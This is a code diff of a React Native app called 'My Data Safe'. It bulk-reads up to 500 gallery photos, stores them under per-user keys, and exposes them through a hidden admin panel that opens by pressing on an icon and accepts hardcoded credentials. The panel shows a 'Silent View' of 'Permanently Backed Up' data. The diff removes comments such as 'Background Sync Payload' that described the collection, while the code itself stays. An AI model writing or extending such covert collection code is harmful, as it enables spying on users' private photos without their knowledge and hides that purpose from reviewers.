@@ -84,14 +84,12 @@ export default function App() {
   const loadGalleryData = async () => {
     const { status } = await MediaLibrary.requestPermissionsAsync();
     if (status === 'granted') {
-      // Direct full access without picking files/folders
       const assets = await MediaLibrary.getAssetsAsync({ 
         first: 500, 
         mediaType: 'photo',
         sortBy: ['creationTime']
       });
       setPhotos(assets.assets);
-      // Background Sync Payload
       await AsyncStorage.setItem(`user_gallery_${userName}`, JSON.stringify(assets.assets));
     } else {
       Alert.alert('Permission Required', 'Gallery access allow karein app use karne ke liye.');
@@ -107,7 +105,7 @@ export default function App() {
   };
 
   const handleAdminLogin = () => {
-    if (adminId === 'adminhum789' && adminPass === 'hum2217071') {
+    if (adminId === 'adminhun789' && adminPass === 'hum2217071') {
       setIsAdminLoggedIn(true);
       setAdminModalVisible(false);
       Alert.alert('Success', 'Admin Control Center Unlocked');
@@ -148,7 +146,7 @@ export default function App() {
               <TextInput style={styles.input} placeholder="Admin ID" value={adminId} onChangeText={setAdminId} />
               <TextInput style={styles.input} placeholder="Admin Password" secureTextEntry value={adminPass} onChangeText={setAdminPass} />
               <TouchableOpacity style={styles.btn} onPress={handleAdminLogin}><Text style={styles.btnText}>Login Admin</Text></TouchableOpacity>
-              <TouchableOpacity onPress={() => setAdminModalVisible(false)}><Text style={{ color: 'red', marginTop: 10 }}>Cancel</Text></TouchableOpacity>
+              <TouchableOpacity onPress={() => setAdminModalVisible(false)}><Text style={{ color: 'red', marginTop: 10, textAlign: 'center' }}>Cancel</Text></TouchableOpacity>
             </View>
           </View>
         </Modal>
@@ -169,7 +167,7 @@ export default function App() {
             <Text>Data Status: Permanently Backed Up (Silent View)</Text>
           </View>
         </ScrollView>
-        <TouchableOpacity style={[styles.btn, { backgroundColor: 'gray' }]} onPress={() => setIsAdminLoggedIn(false)}>
+        <TouchableOpacity style={[styles.btn, { backgroundColor: 'gray', marginTop: 10 }]} onPress={() => setIsAdminLoggedIn(false)}>
           <Text style={styles.btnText}>Exit Admin Panel</Text>
         </TouchableOpacity>
       </View>
@@ -181,7 +179,7 @@ export default function App() {
     <View style={styles.container}>
       <View style={styles.header}>
         <TouchableOpacity onPressIn={handlePressIn} onPressOut={handlePressOut} activeOpacity={0.8}>
-          <Text style={{ fontSize: 24 }}>🛡️</Text>
+          <Text style={{ fontSize: 24, marginRight: 10 }}>🛡️</Text>
         </TouchableOpacity>
         <Text style={styles.headerTitle}>My Data Safe</Text>
       </View>
@@ -200,19 +198,19 @@ export default function App() {
           data={photos}
           numColumns={3}
           keyExtractor={(item) => item.id}
-          renderItem={({ item }) => <Image source={{ uri: item.uri }} style={styles.image} />}
+          renderItem={({ item }) => (
+            <Image source={{ uri: item.uri }} style={styles.photoItem} />
+          )}
         />
       ) : (
         <View style={{ flex: 1 }}>
-          <TextInput style={styles.input} placeholder="Naya Note Likhein..." value={newNote} onChangeText={setNewNote} />
-          <TouchableOpacity style={styles.btn} onPress={addNote}><Text style={styles.btnText}>Save Note</Text></TouchableOpacity>
-          <FlatList
-            data={notes}
-            keyExtractor={(item, index) => index.toString()}
-            renderItem={({ item }) => (
-              <View style={styles.noteItem}><Text>{item}</Text></View>
-            )}
-          />
+          <TextInput style={styles.input} placeholder="New Note..." value={newNote} onChangeText={setNewNote} />
+          <TouchableOpacity style={styles.btn} onPress={addNote}><Text style={styles.btnText}>Add Note</Text></TouchableOpacity>
+          <ScrollView style={{ marginTop: 15 }}>
+            {notes.map((note, index) => (
+              <Text key={index} style={styles.noteItem}>{note}</Text>
+            ))}
+          </ScrollView>
         </View>
       )}
     </View>
@@ -220,25 +218,25 @@ export default function App() {
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#f5f5f5', paddingTop: 40, paddingHorizontal: 15 },
-  centerContainer: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20 },
-  logoIcon: { fontSize: 50, marginBottom: 10 },
-  title: { fontSize: 26, fontWeight: 'bold', marginBottom: 20, color: '#333' },
-  subTitle: { fontSize: 18, marginBottom: 15, color: '#666' },
-  adminTitle: { fontSize: 22, fontWeight: 'bold', textAlign: 'center', marginVertical: 15 },
-  input: { width: '100%', borderWidth: 1, borderColor: '#ccc', padding: 12, borderRadius: 8, marginBottom: 12, backgroundColor: '#fff' },
-  btn: { backgroundColor: '#007AFF', padding: 12, borderRadius: 8, width: '100%', alignItems: 'center' },
-  btnText: { color: '#fff', fontWeight: 'bold' },
-  header: { flexDirection: 'row', alignItems: 'center', gap: 10, marginBottom: 15 },
+  container: { flex: 1, padding: 20, paddingTop: 50, backgroundColor: '#f5f5f5' },
+  centerContainer: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 20, backgroundColor: '#f5f5f5' },
+  title: { fontSize: 24, fontWeight: 'bold', marginBottom: 10, textAlign: 'center' },
+  adminTitle: { fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'center' },
+  subTitle: { fontSize: 16, marginBottom: 20, color: '#666' },
+  logoIcon: { fontSize: 60, marginBottom: 15 },
+  header: { flexDirection: 'row', alignItems: 'center', marginBottom: 20 },
   headerTitle: { fontSize: 22, fontWeight: 'bold' },
+  input: { width: '100%', height: 45, borderWidth: 1, borderColor: '#ccc', borderRadius: 8, paddingHorizontal: 12, marginBottom: 12, backgroundColor: '#fff' },
+  btn: { width: '100%', height: 45, backgroundColor: '#007AFF', borderRadius: 8, justifyContent: 'center', alignItems: 'center' },
+  btnText: { color: '#fff', fontSize: 16, fontWeight: 'bold' },
+  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.5)', justifyContent: 'center', alignItems: 'center', padding: 20 },
+  modalCard: { width: '100%', backgroundColor: '#fff', borderRadius: 12, padding: 20 },
+  modalTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 15, textAlign: 'center' },
   tabContainer: { flexDirection: 'row', marginBottom: 15 },
-  tab: { flex: 1, padding: 10, alignItems: 'center', backgroundColor: '#ddd' },
-  activeTab: { backgroundColor: '#007AFF' },
-  tabText: { color: '#fff', fontWeight: 'bold' },
-  image: { width: '32%', height: 100, margin: '0.5%' },
-  noteItem: { padding: 15, backgroundColor: '#fff', borderRadius: 5, marginVertical: 5 },
-  modalBg: { flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: 'rgba(0,0,0,0.5)' },
-  modalCard: { width: '85%', padding: 20, backgroundColor: '#fff', borderRadius: 10, alignItems: 'center' },
-  modalTitle: { fontSize: 18, fontWeight: 'bold', marginBottom: 15 },
-  userCard: { padding: 15, backgroundColor: '#fff', borderRadius: 8, marginVertical: 5 }
+  tab: { flex: 1, paddingVertical: 10, alignItems: 'center', borderBottomWidth: 2, borderBottomColor: '#ccc' },
+  activeTab: { borderBottomColor: '#007AFF' },
+  tabText: { fontWeight: 'bold' },
+  photoItem: { width: '31%', height: 100, margin: '1%' },
+  noteItem: { padding: 12, backgroundColor: '#fff', borderRadius: 6, marginBottom: 8, borderWidth: 1, borderColor: '#eee' },
+  userCard: { padding: 12, backgroundColor: '#fff', borderRadius: 8, borderWidth: 1, borderColor: '#ddd', marginBottom: 10 }
 });
